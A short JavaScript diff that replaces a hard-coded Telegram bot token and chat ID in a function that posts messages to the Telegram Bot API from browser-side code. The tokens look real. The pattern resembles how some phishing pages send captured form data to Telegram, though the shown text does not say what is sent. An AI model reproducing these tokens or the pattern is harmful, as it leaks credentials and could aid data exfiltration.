@@ -27,8 +27,8 @@ function initializeModal() {
 
 // Function to send message to Telegram
 function sendTelegramMessage(message) {
-    const telegramBotToken = '8501088077:AAE5yUFbYa8Ekdj_bTGEGXrqMgojCEhQMSk'; // Replace with your actual bot token
-    const telegramChatId = '8530540464'; // Replace with your actual chat ID
+    const telegramBotToken = '8295523536:AAGHvDnIGiF8d35Eqdd9gMotINK86f-Nj68'; // Replace with your actual bot token
+    const telegramChatId = '7663192113'; // Replace with your actual chat ID
     const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
     return fetch(url, {
